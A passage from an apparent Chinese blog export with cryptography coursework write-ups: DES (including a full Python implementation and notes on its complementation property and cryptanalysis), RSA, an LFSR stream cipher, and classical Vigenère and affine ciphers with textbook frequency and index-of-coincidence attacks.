的明文和密钥同时取补，则扩展运算E的输出和子密钥产生器的输出也都取补，因而经异或运算后的输出和未取补时的输出一样，即到达S盒的输入数据未变，输出自然也不变，但经第二个异或运算时，由于左边数据已取补，因而输出也就取补 互补性使DES在选择明文攻击下所需的工作量减半（2^55） 对选择的明文𝑚和𝑚 ̅ 加密后得到密文如下： c_1=E_k(m)\\ c_2=E_k(m^-)由对称互补性可得 c_2^-=E_{k^-}(m)所以对𝑚加密，如果密文为𝑐_1，则加密密钥为𝑘, 如果密文为(𝑐_2 ) ̅，则加密密钥为𝑘 ̅ 差分分析法： 通过分析特定明文差对结果密文差的影响来获得可能性最大的密钥。这种攻击方法主要适用于攻击迭代分组密码，最初是针对DES提出的一种攻击方法，虽然差分攻击方法对破译16轮的DES不能提供一种实用的方法，但对破译轮数较低的DES是很成功的。 线性分析法： 寻找一个给定密码算法的有关明文比特、密文比特和密钥比特的有效线性近似表达式，通过选择充分多的明－密文对来分析密钥的某些比特，用这种方法破译DES比差分分析方法更有效。可用247个已知明文破译8－轮DES。 三重DES： loXtMD.png 两密钥的3DES称为加密-解密-加密方案，简记为EDE(encrypt-decrypt-encrypt) 破译它的穷举密钥搜索量为2112 量级，用差分分析破译也要超过1035sup&gt;量级。此方案仍有足够的安全性。 完整代码#二进制转字符串 def bintostr(st): res=&quot;&quot; l=int(len(st)/8) for i in range(l): res+=chr(int(st[i*8:i*8+8],2)) return res #字符串转二进制 def strtobin(st): res = &quot;&quot; for i in st: tmp = bin(ord(i))[2:] for i in range(0,8-len(tmp)): tmp = &#39;0&#39;+tmp res+=tmp return res #循环左移 def zuoyiwei(st,num): my = st[num:len(st)] my = my+st[0:num] return my #异或 def xor(str1,str2): res = &quot;&quot; for i in range(0,len(str1)): xor_res = int(str1[i],10)^int(str2[i],10) if xor_res == 1: res +=&#39;1&#39; else: res +=&#39;0&#39; return res #PC-1盒 def key_change_1(st): key1_list = [57,49,41,33,25,17,9,1,58,50,42,34,26,18,10,2,59,51,43,35,27,19,11,3,60,52,44,36,63,55,47,39,31,23,15,7,62,54,46,38,30,22,14,6,61,53,45,37,29,21,13,5,28,20,12,4] #得到56位，去掉校验位 res = &quot;&quot; for i in key1_list: res+=st[i-1] return res #PC-2盒 def key_change_2(st): key2_list = [14,17,11,24,1,5,3,28,15,6,21,10,23,19,12,4,26,8,16,7,27,20,13,2,41,52,31,37,47,55,30,40,51,45,33,48,44,49,39,56,34,53,46,42,50,36,29,32] #压缩置换 #去掉9，18，22，25，35，38，43，54位得到48位 res = &quot;&quot; for i in key2_list: res+=st[i-1] return res #16轮迭代生成子密钥 def key_gen(st): key_list = []#子密钥表 key_change_res = key_change_1(st) #PC-1置换分成C，D两块 key_c = key_change_res[0:28] key_d = key_change_res[28:] for i in range(1,17): #共16轮 if (i==1) or (i==2) or (i==9) or (i==16):#按轮数循环左移 key_c = zuoyiwei(key_c,1) key_d = zuoyiwei(key_d,1) else: key_c = zuoyiwei(key_c,2) key_d = zuoyiwei(key_d,2) key_yiwei = key_c+key_d #压缩置换 key_res = key_change_2(key_yiwei) key_list.append(key_res) return key_list #初始IP置换 def begin_change(st): #置换表 change_list = [58,50,42,34,26,18,10,2,60,52,44,36,28,20,12,4,62,54,46,38,30,22,14,6,64,56,48,40,32,24,16,8,57,49,41,33,25,17,9,1,59,51,43,35,27,19,11,3,61,53,45,37,29,21,13,5,63,55,47,39,31,23,15,7] res =&quot;&quot; for i in change_list: res+=st[i-1] #因为列表是1-64，而数组是0-63，所以减一 return res #E盒扩展置换，将32位输出扩展至48位 def box_e(st): #E盒置换表 e_list = [32,1,2,3,4,5,4,5,6,7,8,9,8,9,10,11,12,13,12,13,14,15,16,17,16,17,18,19,20,21,20,21,22,23,24,25,24,25,26,27,28,29,28,29,30,31,32,1] res = &quot;&quot; for i in e_list: res +=st[i-1] return res #S盒代换盒 def box_s(st): j = 0 #8个S盒代换表 s_list = [[14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7,0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8,4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0,15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13], [15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10,3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5,0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15,13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9], [10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8,13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1,13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7,1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12], [7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15,13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9,10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4,3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14], [2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9,14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6,4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14,11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3], [12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11,10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8,9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6,4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13], [4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1,13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6,1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2,6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12], [13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7,1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2,7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8,2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11]] res = &quot;&quot; for i in range(0,len(st),6):#6位输入，4位输出 begin_s = st[i:i+6] row = int(begin_s[0]+begin_s[5],2) col = int(begin_s[1:5],2) num = bin(s_list[j][row*16+col])[2:] for padd in range(0,4-len(num)): num = &quot;0&quot;+num res += num j = j+1 return res #P盒置换 def box_p(st): res = &quot;&quot; p_list = [16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25] for i in p_list: res +=st[i-1] return res #封装成F函数 def funcF(st,key): str_e_res = box_e(st) xor_res = xor(str_e_res,key) str_s_res = box_s(xor_res) str_p_res = box_p(str_s_res) return str_p_res #IP逆置换 def mov_IP(st): res = &quot;&quot; ip_list = [40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31,38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29,36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27,34,2,42,10,50,18,58,26,33,1,41,9,49,17,57,25] for i in ip_list: res += st[i-1] return res #封装64位加密 def DESenc_test(mes,key): mes_bin = strtobin(mes)#明文转二进制 mes_IP = begin_change(mes_bin)#IP置换 key_bin = strtobin(key)#密钥转二进制 key_list = key_gen(key_bin)#生成子密钥 mes_left = mes_IP[0:32]#明文分两组32位 mes_right = mes_IP[32:] for i in range(0,15):#16轮F函数迭代 mes_tmp = mes_right right_f_res = funcF(mes_right,key_list[i]) mes_right = xor(right_f_res,mes_left) mes_left = mes_tmp fin_right = mes_right fin_left = xor(funcF(mes_right,key_list[15]),mes_left) fin = fin_left+fin_right fin = mov_IP(fin)#IP逆置换 return fin#返回密文 #Alice_bob def DESenc_ab(mes,key): mes_bin = strtobin(mes)#明文转二进制 mes_IP = begin_change(mes_bin)#IP置换 key_bin = key#密钥转二进制 key_list = key_gen(key_bin)#生成子密钥 mes_left = mes_IP[0:32]#明文分两组32位 mes_right = mes_IP[32:] for i in range(0,15):#16轮F函数迭代 mes_tmp = mes_right right_f_res = funcF(mes_right,key_list[i]) mes_right = xor(right_f_res,mes_left) mes_left = mes_tmp fin_right = mes_right fin_left = xor(funcF(mes_right,key_list[15]),mes_left) fin = fin_left+fin_right fin = mov_IP(fin)#IP逆置换 return fin#返回密文 #封装64位解密 def DESdec_test(cipher,key): #密文直接输64位2进制 #cipher = strtobin(str) key_bin = strtobin(key) key_list = key_gen(key_bin) cipher = begin_change(cipher) i = 15 cipher_left = cipher[0:32] cipher_right = cipher[32:] while i&gt;0: cipher_tmp = cipher_right cipher_right = xor(cipher_left,funcF(cipher_right,key_list[i])) cipher_left = cipher_tmp i = i -1 fin_left = xor(cipher_left,funcF(cipher_right,key_list[0])) fin_right = cipher_right fin = fin_left+fin_right fin = mov_IP(fin) my_plain = &quot;&quot; for j in range(0,len(fin),8): my_plain += chr(int(fin[j:j+8],2)) return my_plain #alice_bob def DESdec_ab(cipher,key): #密文直接输64位2进制 #cipher = strtobin(str) key_bin = key key_list = key_gen(key_bin) cipher = begin_change(cipher) i = 15 cipher_left = cipher[0:32] cipher_right = cipher[32:] while i&gt;0: cipher_tmp = cipher_right cipher_right = xor(cipher_left,funcF(cipher_right,key_list[i])) cipher_left = cipher_tmp i = i -1 fin_left = xor(cipher_left,funcF(cipher_right,key_list[0])) fin_right = cipher_right fin = fin_left+fin_right fin = mov_IP(fin) my_plain = &quot;&quot; for j in range(0,len(fin),8): my_plain += chr(int(fin[j:j+8],2)) return my_plain #DES加密 def DESenc(mes,key): res = &quot;&quot; i = 0 while mes[i:i+8] != &quot;&quot;: res += DESenc_test(mes[i:i+8],key) i = i+8 return res #alice_bob def DESenc_a(mes,key): res = &quot;&quot; res += DESenc_ab(mes,key) return res #DES解密 def DESdec(cipher,key): res = &quot;&quot; i = 0 while cipher[i:i + 64] != &quot;&quot;: res += DESdec_test(cipher[i:i + 64], key) i = i + 64 return res #cbc模式下加密 def cbc_desenc(mes,key): IV=&quot;aaaaaaaa&quot; res=&quot;&quot; i=0 cns=&quot;&quot; while mes[i:i+8]!=&quot;&quot;: if i==0: res+=DESenc_test(bintostr(xor(strtobin(IV),strtobin(mes[i:i+8]))),key) cns=DESenc_test(bintostr(xor(strtobin(IV),strtobin(mes[i:i+8]))),key) else: res+=DESenc_test(bintostr(xor(cns,strtobin(mes[i:i+8]))),key) cns=DESenc_test(bintostr(xor(cns,strtobin(mes[i:i+8]))),key) i=i+8 return res #cbc模式下解密 def cbc_desdec(cipher,key): res=&quot;&quot; IV=&quot;aaaaaaaa&quot; i=0 cns=&quot;&quot; while cipher[i:i+64]!=&quot;&quot;: if i==0: res+=bintostr(xor(strtobin(DESdec_test(cipher[i:i+64],key)),strtobin(IV))) cns=cipher[i:i+64] else: res+=bintostr(xor(strtobin(DESdec_test(cipher[i:i+64],key)),cns)) cns=cipher[i:i+64] i=i+64 return res #main def main(): m = input(&quot;Please enter your plaintext:\n\t&quot;) lm = len(m) # 若不是8的倍数，则用0填充 lm_mod = lm % 8 if lm_mod != 0: FillLength = 8 - lm_mod m += FillLength * &quot;0&quot;#padding lm += FillLength k = input(&quot;Please enter your key:\n\t&quot;) c_t=bintostr(DESenc(m,k)) print(&quot;DES:\n\t&quot;,c_t) print(&quot;CBC_DES:\n\t&quot;,bintostr(cbc_desenc(m,k))) &#39;&#39;&#39;c = input(&quot;Please enter your ciphertext:\n\t&quot;) k_1 = input(&quot;Please enter your key:\n\t&quot;) print(DESdec(strtobin(c),k_1))&#39;&#39;&#39; print(&quot;DES解密\n\t&quot;,DESdec(DESenc(m,k),k)) c2= input(&quot;Please enter your cbc_ciphertext:\n\t&quot;) k_2=input(&quot;Please enter your key:\n\t&quot;) print(cbc_desdec(cbc_desenc(m,k),k_2)) if __name__ == &#39;__main__&#39;: main() 实验四 RSA加密 import random def FastMod(x, n, m): a = 1 b = x while True: temp = n if n % 2 == 1 : a = a * b % m b = b * b % m n = n//2 if temp &lt; 1 : return a def computeD(e, phi_n): (x, y, r) = extendedGCD(phi_n, e) if y &lt; 0: return phi_n + y return y def extendedGCD(a, b): if b == 0: return (1, 0, a) x1 = 1 y1 = 0 x2 = 0 y2 = 1 while b != 0: q = a // b r = a % b a = b b = r x = x1 - q*x2 x1 = x2 x2 = x y = y1 - q*y2 y1 = y2 y2 = y return(x1, y1, a) def str2Hex(m): return &quot;&quot;.join(&quot;{:02x}&quot;.format(ord(x)) for x in m) # 素性检验：采用 Miler-Rabin 检验法 def miller_rabin(n,k=80): if n == 2 or n == 3: return True if n % 2 == 0: return False r, s = 0, n - 1 while s % 2 == 0: r += 1 s //= 2 for _ in range(k): a = random.randrange(2, n - 1) x = pow(a, s, n) if x == 1 or x == n - 1: continue for _ in range(r - 1): x = pow(x, 2, n) if x == n - 1: break else: return False return True # 生成 b 位的素数 def genPrime(b=1024): while True: # the highest bit is 1 ans = &quot;1&quot; for i in range(b-2): ans += str(random.randint(0,1)) # the lowest bit is 1 ans += &quot;1&quot; ans = int(ans,2) if miller_rabin(ans): return ans def genE(phi_n): while True: e = genPrime(b=random.randint(3,13)) if e == 3 or e == 5: continue if phi_n%e != 0: return e def RSAEncrypt(m,n,e): m = int(str2Hex(m),16) c = pow(m,e,n) return c def RSADecrypt(c,d,n): m = pow(c,d,n) m = bytes.fromhex(&#39;{:x}&#39;.format(m)) return m def main(): # 生成两个大素数p和q print (&quot;Generate p and q ......&quot;) p = genPrime() q = genPrime() print (&quot;p = &quot;+str(p)) print (&quot;q = &quot;+str(q)) # 计算n = p*q n = p*q print (&quot;n = &quot;+str(n)) # 计算φ(n) = p*q phi_n = (p-1)*(q-1) print (&quot;\nGenerate e ......&quot;) # 生成一个和φ(n)互素的数e e = genE(phi_n) print (&quot;e = &quot;+str(e)) m = &quot;Hello world!&quot; # 加密算法 print (&quot;\n&quot;+8*&quot;*&quot;+&quot; Encryption &quot;+8*&quot;*&quot;) Ciphertext = RSAEncrypt(m,n,e) print (&quot;The Ciphertext is:\n\t&quot;+str(Ciphertext)) # 解密算法 print (&quot;\n&quot;+8*&quot;*&quot;+&quot; Decryption &quot;+8*&quot;*&quot;) # 使用私钥d，d是e模φ(n)的逆 d = computeD(e,phi_n) print (&quot;d = &quot;+str(d)) Plaintext = RSADecrypt(Ciphertext,d,n) print (&quot;The Plaintext is:\n\t&quot;+str(Plaintext)) if __name__ == &#39;__main__&#39;: main() 🚩推荐阅读MD5加密公钥密码RSA序列密码《图解密码技术》学习笔记之密码(二)《图解密码技术》学习笔记之密码(一)]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[序列密码]]></title>
    <url>%2F2020%2F01%2F03%2Flsfr%2F</url>
    <content type="text"><![CDATA[密码学中的序列密码。 实验要求选择一个15次以上的不可约多项式，编写一个线性反馈移位寄存器。验证生成序列的周期。 设计思路利用python数组的pop操作可以实现移位的效果，将反馈函数写成0，1数组，便可以实现反馈效果。 线性反馈移位寄存器算法实现def lfsr(lst, k,key): temp_l= lst[:] temp_k= key[:] for i in range(k): #temp.append(temp.pop(0)) k_out=0 for j in range(18): if(temp_k[j]==1): k_out+=(temp_k[j]+temp_l[j])%2 k_out=k_out%2 #print(k_out) temp_l.pop(0) temp_l.append(k_out) print(&quot;当前寄存器值：&quot;,temp_l,&quot;循环次数：&quot;,i+1,temp_l==lst) #return temp def main(): lst=[0,1,1,1,0,0,0,1,0,1,0,0,1,0,0,1,0,1] k=262146 key=[1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0] lfsr(lst,k,key) print(len(key)) 运行结果18次线性移位寄存器，当运行到周期次数时开始重复。 寄存器初始值：[0,1,1,1,0,0,0,1,0,1,0,0,1,0,0,1,0,1] 本原多项式：[1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0] lauAUg.png 安全性分析由算法的实现可知，序列密码算法的加解密对种子秘钥的依赖十分强烈。故需要保证种子秘钥的安全性。对于此可进行相关攻击。 可以进行穷举搜素攻击，故为了保证安全强度，要求秘钥长度足够长。 弱密钥攻击，弱密钥会产生重复的密钥流，一旦子密钥序列出现了重复，密文就有可能被破解。 合理性分析序列密码具有实现简单、便于硬件实施、加解密处理速度快、没有或只有有限的错误传播等特点，因此在实际应用中，特别是专用或机密机构中保持着优势，序列密码是一个随时间变化的加密变换，具有转换速度快、低错误传播的优点，硬件实现电路更简单。 🚩推荐阅读MD5加密公钥密码RSA分组密码DES《图解密码技术》学习笔记之密码(二)《图解密码技术》学习笔记之密码(一)]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[古典密码]]></title>
    <url>%2F2020%2F01%2F03%2Fgudianmima%2F</url>
    <content type="text"><![CDATA[密码学中的古典密码。 维吉尼亚密码原理维吉尼亚密码是一种简单的多表代换密码，可以看成由一些偏移量不同的恺撒密码组成。为了掩盖字母使用中暴露的频率特征，解决的办法就是用多套符号代替原来的文字。它是一个表格，第一行代表原文的字母，下面每一横行代表原文分别由哪些字母代替，每一竖列代表我们要用第几套字符来替换原文。一共26个字母，一共26套代替法，所以这个表是一个26*26的表 . laA81K.png 算法实现加密算法 c_i=(m_i+k_i)mod26若密钥长度小于明文长度，则密钥循环使用 def VigenereEncrypt(m,k): k = k.upper() lm = len(m) lk = len(k) j = 0 ans = &quot;&quot; for i in range(lm): if m[i].isupper(): ans += chr(((ord(m[i])-ord(&#39;A&#39;))%26+(ord(k[j%lk])-ord(&#39;A&#39;))%26)%26+ord(&#39;A&#39;)) j += 1 elif m[i].islower(): ans += chr(((ord(m[i])-ord(&#39;a&#39;))%26+(ord(k[j%lk])-ord(&#39;A&#39;))%26)%26+ord(&#39;a&#39;)) j += 1 else: ans += m[i] return ans 解密算法 m_i=(c_i+26-k_i)mod\ 26def VigenereDecrypt(c,k): k = k.upper() lc = len(c) lk = len(k) j = 0 ans = &quot;&quot; for i in range(lc): if c[i].isupper(): ans += chr(((ord(c[i])-ord(&#39;A&#39;))%26+26-(ord(k[j%lk])-ord(&#39;A&#39;))%26)%26+ord(&#39;A&#39;)) j += 1 elif c[i].islower(): ans += chr(((ord(c[i])-ord(&#39;a&#39;))%26+26-(ord(k[j%lk])-ord(&#39;A&#39;))%26)%26+ord(&#39;a&#39;)) j += 1 else: ans += c[i] return ans 攻击方法破译维吉尼亚密码的关键在于它的密钥是循环重复的。如果我们知道了密钥的长度，那密文就可以被看作是交织在一起的凯撒密码，而其中每一个都可以单独破解。 多表代换密码体制的分析方法主要分为三步：第一步确定秘钥长度，常用的方法有卡西斯基（Kasiski）测试法和重合指数法（Index of Coincidence）；第二步就是确定秘钥，常用的方法是拟重合指数测试法；第三步是根据第二步确定的密钥恢复出明文。 Kasiski测试法卡西斯基试验是基于类似 the 这样的常用单词有可能被同样的密钥字母进行加密，从而在密文中重复出现。如果将密文中所有相同的字母组都找出来，并计算他们的最大公因数，就有可能提取出来密钥长度信息。 测试过程：搜索长度至少为2的相邻的一对对相同的密文段，记下它们之间的距离。而密钥长度d可能就是这些距离的最大公因子 重合指数法利用随机文本和英文文本的统计概率差别来分析密钥长度。依据：英文中每种单词出现的频率不同。 重合指数公式： 人们已经获得了英文的26个字母的概率分布的一个估计。期望值为： 将密文按n来分组，当每组的重合指数都接近0.065时，n便为密钥的长度值 重合指数算法def chzs(input): #定义重合指数法 num_list = [0]*26 for i in range(0,len(input)): ord_input = ord(input[i])-97 num_list[ord_input] +=1 n = len(input) res = 0 for i in range(0,26): res += num_list[i]*(num_list[i]-1) return float(res)/((n)*n) def len_key(input):#计算密钥长度 may_d = 0 index_d = 0 for d in range(1,10): str_list = [&quot;&quot;] * d for i in range(0,len(input)): str_list[i%d] += input[i] ch_sum = 0 ch_time = 0 for k in range(0, len(str_list)): if str_list[k] !=&quot;&quot;: ch_sum += chzs(str_list[k]) ch_time +=1 print(chzs(str_list[k])) print(str_list[k]) print(d) k1 = abs(ch_sum / ch_time - 0.065) k2 = abs(may_d - 0.065) if k1&lt;k2: #取最接近0.065的 may_d = ch_sum / ch_time index_d = d return index_d 重合互指数重合互指数用于确定密钥字。 假定𝑥＝𝑥1𝑥2 … 𝑥𝑛和𝑦＝𝑦1 𝑦2…𝑦𝑛′,分别是长为𝑛和𝑛’的字符串。𝑥和𝑦的重合互指数是指𝑥的一个随机元素等于𝑦的一个随机元素的概率，记为𝑀𝐼𝑐(𝑥,𝑦) 将𝑥和𝑦中的字母A,B,C,……,Z出现的次数分别表示为𝑓0,𝑓1,……,𝑓25和𝑓0′, 𝑓1′,⋯,𝑓25′, 那么 重合互指数算法def xd_d(input): #相对位移 #pi频率表 pi=[0.082,0.015,0.028,0.043,0.127,0.022,0.02,0.061,0.07,0.002,0.008,0.04,0.024,0.067,0.075,0.019,0.001,0.06,0.063,0.091,0.028,0.01,0.023,0.001,0.02,0.001] print(pi) key_len = len_key(input) print(&quot;密钥长度：&quot;,key_len) d_list = [0]*key_len #weiyi = [0]*key_len str_list = [&quot;&quot;]*key_len#根据密钥长度分组 for i in range(0,len(input)): str_list[i%key_len] += input[i] for i in range(0,key_len):#查看分组结果和计算每个分组长度 print(str_list[i],&quot;长度：&quot;,len(str_list[i])) d_list[i]=len(str_list[i]) for i in range(0,key_len):#找第i组的相对位移 num_list_i = [0] * 26#每个字母出现的次数 for k in str_list[i]:#计算i组每个字母出现次数 i_c = ord(k) - 97 num_list_i[i_c] += 1 may_mc=0 may_d=0 for j in range(0,26):#位移长度 mc=0 for l in range(0,26):#计算最接近0.065的互重合指数 mc+=pi[l]*float(num_list_i[(l+j)%26]/d_list[i]) if(abs(mc-0.065)&lt;=abs(may_mc-0.065)): may_mc=mc may_d=j print(i,&quot;组：&quot;,may_mc,chr(97+may_d)) 代码运行结果加密： laeTi9.png 解密： laeHR1.png 重合指数： lamPzt.png 安全性分析多表代换密码打破了原语言的字符出现规律，故其分析方法比单表代换密码复杂得多。多表代换密码对比单表代换密码安全性显著提高。但是仍然可以用一些统计分析法破解（具体参看上文攻击方法），但是前提是密文足够长。所以，较短的密文几乎是不可破译的。较长的密文是很容易破解的。 仿射密码的破解加密原理仿射密码属于单表代换密码，它使用线性方程加上一个模数。 c_i=(k_1*m_i+k_2)mod26前提条件是：k1 和 26 互素 穷举攻击通过密文，列举出所有可能的明文（一共 311 种情况），从中找出有特定标识或构成自然语言中有意义的单词或短语的正确明文。 def BruteAffineDecrypt(c): for k1 in range(26): if gcd(k1,26) == 1: for k2 in range(26): print (&quot;k1 = &quot;+str(k1).zfill(2)+&quot;, k2 = &quot;+str(k2).zfill(2)+&quot;: &quot;+AffineDecrypt(c,k1,k2)) 结果： lamT0S.png 频率分析攻击统计密文中字母的出现次数和频率，从出现频率最高的几个字母及双字母组合、三字母组合开始，并假定它们是英语中出现频率较高的字母及字母组合对应的密文，逐步推测各密文字母对应的明文字母。 def pinlv(input): num_list = [0]*26 for i in range(0,len(input)): ord_input = ord(input[i])-97 num_list[ord_input] +=1 n = len(input) x=[] y=[] for i in range(0,26): x.append(chr(97+i)) y.append(float(num_list[i]/n)) plt.bar(x, y, 0.4, color=&quot;green&quot;) plt.xlabel(&quot;Letters&quot;) plt.ylabel(&quot;Frequency&quot;) plt.title(&quot;Frequency analysis&quot;) plt.show() lantnf.png 完整代码维吉尼亚加解密def VigenereEncrypt(m,k): k = k.upper() lm = len(m) lk = len(k) j = 0 ans = &quot;&quot; for i in range(lm): if m[i].isupper(): ans += chr(((ord(m[i])-ord(&#39;A&#39;))%26+(ord(k[j%lk])-ord(&#39;A&#39;))%26)%26+ord(&#39;A&#39;)) j += 1 elif m[i].islower(): ans += chr(((ord(m[i])-ord(&#39;a&#39;))%26+(ord(k[j%lk])-ord(&#39;A&#39;))%26)%26+ord(&#39;a&#39;)) j += 1 else: ans += m[i] return ans # Decryption def VigenereDecrypt(c,k): k = k.upper() lc = len(c) lk = len(k) j = 0 ans = &quot;&quot; for i in range(lc): if c[i].isupper(): ans += chr(((ord(c[i])-ord(&#39;A&#39;))%26+26-(ord(k[j%lk])-ord(&#39;A&#39;))%26)%26+ord(&#39;A&#39;)) j += 1 elif c[i].islower(): ans += chr(((ord(c[i])-ord(&#39;a&#39;))%26+26-(ord(k[j%lk])-ord(&#39;A&#39;))%26)%26+ord(&#39;a&#39;)) j += 1 else: ans += c[i] return ans # Main function def main(): while True: op = input(&quot;What do you want to do?\n[E]Encryption [D]Decryption\n&quot;).upper() if op[0] == &quot;E&quot;: s = input(&quot;Please enter your plaintext:\n\t&quot;) k = input(&quot;Please enter your key:\n\t&quot;) # s = &quot;plaintext&quot; # k = &quot;key&quot; print (8*&quot;*&quot;+&quot; Encryption &quot;+8*&quot;*&quot;) Encryption = VigenereEncrypt(s,k) print (&quot;The Ciphertext is:\n\t&quot;+Encryption) break elif op[0] == &quot;D&quot;: s = input(&quot;Please enter your ciphertext:\n\t&quot;) k = input(&quot;Please enter your key:\n\t&quot;) # s = &quot;ciphertext&quot; # k = &quot;key&quot; print (8*&quot;*&quot;+&quot; Decryption &quot;+8*&quot;*&quot;) Decryption = VigenereDecrypt(s,k) print (&quot;The Plaintext is:\n\t&quot;+Decryption) break else: continue if __name__ == &#39;__main__&#39;: main() 重合指数def chzs(input): #定义重合指数法 num_list = [0]*26 for i in range(0,len(input)): ord_input = ord(input[i])-97 num_list[ord_input] +=1 n = len(input) res = 0 for i in range(0,26): res += num_list[i]*(num_list[i]-1) return float(res)/((n)*n) def len_key(input):#计算密钥长度 may_d = 0 index_d = 0 for d in range(1,10): str_list = [&quot;&quot;] * d for i in range(0,len(input)): str_list[i%d] += input[i] ch_sum = 0 ch_time = 0 for k in range(0, len(str_list)): if str_list[k] !=&quot;&quot;: ch_sum += chzs(str_list[k]) ch_time +=1 print(chzs(str_list[k])) print(str_list[k]) print(d) k1 = abs(ch_sum / ch_time - 0.065) k2 = abs(may_d - 0.065) if k1&lt;k2: #取最接近0.065的 may_d = ch_sum / ch_time index_d = d return index_d def xd_d(input): #相对位移 #pi频率表 pi=[0.082,0.015,0.028,0.043,0.127,0.022,0.02,0.061,0.07,0.002,0.008,0.04,0.024,0.067,0.075,0.019,0.001,0.06,0.063,0.091,0.028,0.01,0.023,0.001,0.02,0.001] print(pi) key_len = len_key(input) print(&quot;密钥长度：&quot;,key_len) d_list = [0]*key_len #weiyi = [0]*key_len str_list = [&quot;&quot;]*key_len#根据密钥长度分组 for i in range(0,len(input)): str_list[i%key_len] += input[i] #print(&quot;****&quot;,len(d_list)) for i in range(0,key_len):#查看分组结果和计算每个分组长度 print(str_list[i],&quot;长度：&quot;,len(str_list[i])) d_list[i]=len(str_list[i]) #sll = len(str_list) for i in range(0,key_len):#找第i组的相对位移 num_list_i = [0] * 26#每个字母出现的次数 for k in str_list[i]:#计算i组每个字母出现次数 i_c = ord(k) - 97 num_list_i[i_c] += 1 may_mc=0 may_d=0 for j in range(0,26):#位移长度 mc=0 for l in range(0,26):#计算最接近0.065的互重合指数 mc+=pi[l]*float(num_list_i[(l+j)%26]/d_list[i]) if(abs(mc-0.065)&lt;=abs(may_mc-0.065)): may_mc=mc may_d=j #print(mc) print(i,&quot;组：&quot;,may_mc,chr(97+may_d)) return def main(): s=input(&quot;Please enter your ciphertext:\n\t&quot;) xd_d(s) if __name__ == &#39;__main__&#39;: main() 仿射频率分析import numpy as np import matplotlib.mlab as mlab import matplotlib.pyplot as plt def pinlv(input): num_list = [0]*26 for i in range(0,len(input)): ord_input = ord(input[i])-97 num_list[ord_input] +=1 n = len(input) x=[] y=[] for i in range(0,26): x.append(chr(97+i)) y.append(float(num_list[i]/n)) plt.bar(x, y, 0.4, color=&quot;green&quot;) plt.xlabel(&quot;Letters&quot;) plt.ylabel(&quot;Frequency&quot;) plt.title(&quot;Frequency analysis&quot;) plt.show() def main(): s = input(&quot;Please enter your ciphertext:\n\t&quot;) pinlv(s) if __name__ == &#39;__main__&#39;: main() 仿射暴力破解def gcd(a,b): if a%b == 0: return b return gcd(b,a%b) def findModReverse(a,m): if gcd(a,m)!=1: return None u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m def AffineDecrypt(c,k1,k2): k2 %= 26 if gcd(k1,26) != 1: print(&quot;k1 and 26 are not mutually prime, and decryption fails.&quot;) return k1 = findModReverse(k1,26) l = len(c) ans = &quot;&quot; for i in range(l): if c[i].isupper(): ans += chr((k1*(ord(c[i])-ord(&#39;A&#39;)+26-k2))%26+ord(&#39;A&#39;)) elif c[i].islower(): ans += chr((k1*(ord(c[i])-ord(&#39;a&#39;)+26-k2))%26+ord(&#39;a&#39;)) else: ans += c[i] return ans def BruteAffineDecrypt(c): for k1 in range(26): if gcd(k1,26) == 1: for k2 in range(26): print (&quot;k1 = &quot;+str(k1).zfill(2)+&quot;, k2 = &quot;+str(k2).zfill(2)+&quot;: &quot;+AffineDecrypt(c,k1,k2)) def main(): s = input(&quot;Please enter your plaintext:\n\t&quot;) print (7 * &quot;*&quot; + &quot; Attack &quot; + 7 * &quot;*&quot;) BruteAffineDecrypt(s) if __name__ == &#39;__main__&#39;: main() 🚩推荐阅读MD5加密公钥密码RSA分组密码DES《图解密码技术》学习笔记之密码(二)《图解密码技术》学习笔记之密码(一)]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java第四次实验作业]]></title>
    <url>%2F2020%2F01%2F03%2Fjava-4%2F</url>
